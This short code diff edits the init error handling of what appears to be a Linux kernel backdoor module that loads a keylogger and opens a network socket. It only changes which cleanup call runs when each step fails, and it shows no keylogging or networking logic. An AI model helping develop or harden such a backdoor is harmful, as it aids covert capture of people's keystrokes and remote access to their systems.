@@ -21,14 +21,13 @@ static int __init backdoor_init(void)
 	err = keylogger_module_init();
   if(err){
     printk(KERN_ERR "backdoor: error initializing keylogger\n");
-    keylogger_module_exit();
     return err;
   }
 
   err = backdoor_socket_init(PORT);
   if(err){
     printk(KERN_ERR "backdoor: error initializing socket\n");
-    backdoor_socket_exit();
+    keylogger_module_exit();
     return err;
   }
 
